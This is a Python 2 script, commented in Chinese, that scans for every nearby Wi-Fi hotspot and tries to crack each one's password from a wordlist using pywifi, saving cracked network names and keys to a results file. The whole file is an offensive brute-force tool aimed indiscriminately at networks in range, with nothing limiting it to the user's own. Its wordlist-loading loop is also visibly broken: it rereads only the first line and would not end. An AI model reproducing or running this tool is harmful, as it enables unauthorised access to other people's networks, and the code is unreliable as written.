#!/usr/bin/env python
# coding=utf-8

'''
这里显示本次测试使用了11个弱口令，并扫描到了20个热点，然后开始坑爹的跑起来了

WIFIID 热点的id号 每跑一个会减1
SSID OR BSSID 热点的ssid名或mac地址
N 对热点的连接状态，这个在
time 当前所花去的时间
signal 热点的信号强度，若小越好
KEYNUM 测试密码的id 每跑一个会减1
KEY 当前测试的密码
'''
import platform
print platform.system().lower()
import sys,os
# import pywifi
from pywifi import PyWiFi
import time


# 扫描周围热点
def scans(face, timeout):
    # 开始扫描
    face.scan()
    time.sleep(timeout)
    # 在若干秒后获取扫描结果
    return face.scan_results()

# 热点测试
# 这里后续推荐将扫描过程数据入库，防止重复扫描，且更加直观。
def test(i, face, x, key, stu, ts):
    # 显示对应网络名称，考虑到部分中文名则显示bssid
    showID = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid
    # 迭代字典并进行爆破
    for n, k in enumerate(key):
        x.key = k.strip()
        # 移除所有热点配置
        face.remove_all_network_profiles()
        # 讲封装好的目标尝试连接
        face.connect(face.add_network_profile(x))

        # 初始化状态码，考虑到用0会发生些逻辑错误
        code = 10
        t1 = time.time()
        # 循环刷新状态，如果置为0则密码错误，如超时则进行下一个
        while code != 0:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            if now > ts:
                break

            stu.write("\r%-*s|%-*s|%s|%*.2fs|%-*s|%-*s%*s" % (
            6, i, 18, showID, code, 5, now, 7, x.signal, 10, len(key) - n, 10, k.replace("\n", "")))
            stu.flush()
            if code == 4:
                face.disconnect()
                return "%-*s|%s|%*s|%*s\n" % (20, x.ssid, x.bssid, 3, x.signal, 15, k)

    return False

def main():
    # 扫描时长
    scantimes = 3
    # 单个密码测试延迟
    testtimes = 15
    output = sys.stdout
    # 结果文件保存路径
    files = "TestRes.txt"
    # 字典列表 super_keys
    file_path = os.path.abspath('../../../test.txt')
    print file_path
    while 1:
        key = open(file_path, "r").readline()
        if not key:
            break
    # keys = open(file_path, "r").readlines()
    # print"|KEYS %s" % (len(keys))
    # 实例化一个pywifi对象
    wifi = PyWiFi()
    # 选择定一个网卡并赋值于iface
    iface = wifi.interfaces()[0]
    # 通过iface进行一个时长为scantimes的扫描并获取附近的热点基础配置
    scanres = scans(iface, scantimes)
    # 统计附近被发现的热点数量
    nums = len(scanres)
    print "|SCAN GET {0}".format(nums)

    print"%s\n%-*s|%-*s|%-*s|%-*s|%-*s|%-*s%*s\n%s" % (
    "-" * 70, 6, "WIFIID", 18, "SSID OR BSSID", 2, "N", 4, "time", 7, "signal", 10, "KEYNUM", 10, "KEY", "=" * 70)
    # 将每一个热点信息逐一进行测试
    for i, x in enumerate(scanres):
        # 测试完毕后，成功的结果讲存储到files中
        res = test(nums - i, iface, x, key, output, testtimes)
        print res
        if res:
            open(files, "a").write(res)


if __name__ == '__main__':
    main()